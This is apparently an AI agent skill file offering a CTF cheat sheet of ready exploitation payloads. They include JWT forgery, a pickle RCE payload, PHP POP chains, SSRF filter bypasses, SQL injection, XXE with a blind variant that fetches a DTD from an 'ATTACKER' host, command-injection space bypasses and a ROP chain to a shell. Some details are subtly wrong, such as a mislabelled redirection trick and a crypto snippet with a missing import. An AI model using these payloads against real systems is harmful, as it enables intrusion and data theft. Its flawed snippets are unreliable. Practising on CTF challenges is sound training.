---
name: ctf-common-patterns
description: Common CTF exploitation patterns, quick wins, and time-saving tricks for web, crypto, pwn, and misc challenges. Use when you are stuck on a CTF challenge or want to rapidly test known patterns.
metadata:
  hermes:
    category: ctf
    tags: [ctf, web, crypto, pwn, forensics, quick-wins]
platforms: [linux, macos, windows]
---

# CTF Common Patterns

## When to Use

Use this skill when:
- You are competing in a CTF and need rapid exploitation patterns
- You have found a potential vulnerability but need the "standard" payload or trick
- You want to check common flag locations and quick-win techniques before deep analysis
- Time is limited and you need the highest-probability paths first

---

## Flag Location Quick Reference

Always check these first (ordered by speed):

```bash
# Environment variables
env | grep -i flag
printenv | grep -i flag

# Common file locations
cat /flag.txt
cat /flag
cat /root/flag.txt
cat /root/flag
cat /home/*/flag.txt
cat /tmp/flag.txt
cat /var/flag.txt
cat /opt/flag.txt
find / -maxdepth 3 -name "*flag*" -type f 2>/dev/null

# Database
# If you have SQLi, try: SELECT * FROM flag; SELECT flag FROM flags;

# Process memory strings
strings /proc/1/environ | grep -i flag

# Web root
curl http://target/flag.txt
curl http://target/flag
```

---

## Web Patterns

### Pattern 1: JWT None Algorithm

If JWT header has `"alg": "none"`, the signature is ignored.
```python
import jwt
token = jwt.encode({"user":"admin"}, key="", algorithm="none")
```

If server rejects `"none"`, try case variations: `"None"`, `"nOnE"`, `"NONE"`.

### Pattern 2: JWT Algorithm Confusion (RS256 -> HS256)

If server verifies with RSA public key but accepts HS256:
1. Extract public key from `/jwks.json`, `/.well-known/jwks.json`, or PEM endpoint.
2. Use the public key as HMAC secret:
```python
import jwt
with open("pubkey.pem") as f:
    pub = f.read()
token = jwt.encode({"user":"admin"}, key=pub, algorithm="HS256")
```

### Pattern 3: Python Pickle Deserialization

If user input is passed to `pickle.loads()`:
```python
import pickle, os, base64
class R:
    def __reduce__(self):
        return (os.system, ("cat /flag.txt",))
payload = base64.b64encode(pickle.dumps(R()))
```

Common contexts: cookies, session data, cache keys, RPC bodies.

### Pattern 4: PHP Type Juggling (== vs ===)

If authentication uses `==` or `md5($pass) == $hash`:
- `"0e462097431906509019562988736854"` MD5 starts with `0e` → treated as `0` in loose comparison.
- `"0" == "0e123456"` is `true` in PHP.
- Magic hashes reference: `references/php-magic-hashes.txt`

### Pattern 5: PHP Unserialize POP Chain

If `unserialize()` is called with user input:
1. Find gadget chains with `phpggc`:
   ```bash
   phpggc -l | grep RCE
   phpggc Laravel/RCE1 system "cat /flag"
   ```
2. If framework is custom, manually build POP chain by tracing `__wakeup` -> `__destruct` -> `__toString` -> method calls.

### Pattern 6: SSRF with Filter Bypass

If URL filters block `127.0.0.1` and `localhost`:
- `http://0/`, `http://0177.0.0.1/`, `http://2130706433/`
- `http://127.1/`, `http://127.0.1/`
- `http://[::1]/`, `http://[0:0:0:0:0:0:0:1]/`
- DNS rebinding: `http://make-127.0.0.1-rebind-8f34a.yourdomain.com/`
- Redirect: Host a 302 redirect to `http://127.0.0.1/` on an allowed domain.

### Pattern 7: SQLi in ORDER BY / LIMIT

If injection point is in `ORDER BY` or `LIMIT`:
- `ORDER BY` does not accept UNION, but accepts `IF()` and subqueries:
  ```sql
  ORDER BY IF((SELECT ascii(substr(flag,1,1)) FROM flag)=73, id, price)
  ```
- `LIMIT` injection: `LIMIT 1 PROCEDURE ANALYSE(EXTRACTVALUE(1, concat(0x3a, (SELECT flag FROM flags))))`

### Pattern 8: XML External Entity (XXE)

If XML is parsed:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<root>
  <data>&xxe;</data>
</root>
```

If DTD is blocked, use parameter entities for blind XXE:
```xml
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///flag.txt">
  <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
  %dtd;
]>
```

### Pattern 9: Command Injection without Spaces

If spaces are filtered:
```bash
# IFS substitution
cat${IFS}/flag.txt

# Brace expansion
cat{,}/flag.txt

# Tab/newline
cat$IFS$9/flag.txt

# Backtick line continuation
cat</flag.txt

# Variable expansion
X="/flag.txt";cat$X
```

---

## Crypto Patterns

### Pattern 1: ECB Byte-at-a-Time

If oracle encrypts `prefix || attacker_controlled || secret` using ECB:
1. Discover block size by increasing input length until ciphertext jumps by one block.
2. Brute-force one byte at a time by aligning target byte at block boundary.
3. Reference: `references/ecb-oracle.py`

### Pattern 2: CBC Bit-Flipping

If you can modify IV/ciphertext and server decrypts with meaningful error:
```python
def flip(ciphertext, pos, original, target):
    # XOR the byte at position 'pos' with (original ^ target)
    modified = bytearray(ciphertext)
    modified[pos] ^= ord(original) ^ ord(target)
    return bytes(modified)
```

Common target: flip admin=false to admin=true in JSON payload.

### Pattern 3: RSA Common Modulus

If two users share the same modulus `n` with different exponents `e1`, `e2`:
```python
from gmpy2 import invert
r = gmpy2.gcdext(e1, e2)
m = pow(c1, r[1], n) * pow(c2, r[2], n) % n
```

### Pattern 4: RSA Wiener Attack

If `d < n^0.25 / 3`, use continued fractions to recover `d` from public key.
```python
from Crypto.PublicKey import RSA
from owiener import attack
key = RSA.import_key(open('pub.pem').read())
d = attack(key.e, key.n)
```

---

## Pwn / Binary Patterns

### Pattern 1: ret2win

If binary has a `win()` function:
1. Find offset with cyclic pattern:
   ```bash
   pwn template --quiet binary | cat
   cyclic 200 > payload
   # In GDB, check crash address, e.g., 0x6161616161616169
   cyclic -l 0x6161616161616169
   ```
2. Overwrite return address with `win()` address.

### Pattern 2: Format String Write

If user input is passed directly to `printf()`:
```python
# Leak stack: %p.%p.%p
# Write arbitrary value: target_addr = value
payload = fmtstr_payload(offset, {target_addr: value})
```

Common targets: GOT overwrite (replace `puts@GOT` with `system`), stack cookie bypass.

### Pattern 3: ROP Gadget Hunt

```bash
ROPgadget --binary binary --ropchain
# Or with pwntools:
context.binary = './binary'
rop = ROP(binary)
rop.call(rop.find_gadget(['pop rdi', 'ret'])[0], [next(binary.search(b'/bin/sh'))])
rop.call(binary.symbols['system'])
```

---

## Misc / Forensics Patterns

### Pattern 1: Steganography Quick Checks

```bash
# LSB extract
zsteg image.png

# Strings with wide char
strings -e l image.png

# Binwalk for embedded files
binwalk -e image.png

# Exiftool for metadata
exiftool image.png | grep -i flag

# Steghide (try empty password or 'password')
steghide extract -sf image.jpg -p ""
```

### Pattern 2: PCAP Analysis

```bash
# Follow TCP streams
tshark -r capture.pcap -q -z follow,tcp,ascii,0

# Extract files
 foremost -i capture.pcap -o output/

# Search for HTTP credentials
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri -e http.authbasic
```

---

## Pitfalls

- **Overthinking:** CTFs are designed to be solvable. If your approach requires 15 steps, reconsider.
- **Not checking common locations first:** Always run the flag-finding checklist before deep analysis.
- **Wrong environment:** Some exploits work locally but not remotely due to ASLR, stack canaries, or different libc versions. Always verify remote behavior.
- **Case sensitivity:** Windows is case-insensitive; Linux is case-sensitive. Adjust payloads accordingly.
- **Time zones:** Some time-based challenges require UTC. Use `date -u`.

## Verification Checklist

- [ ] Flag matches expected format (usually `flag{...}`, `CTF{...}`, or `picoCTF{...}`)
- [ ] Flag submitted successfully to scoreboard
- [ ] If challenge is multi-stage, all parts extracted
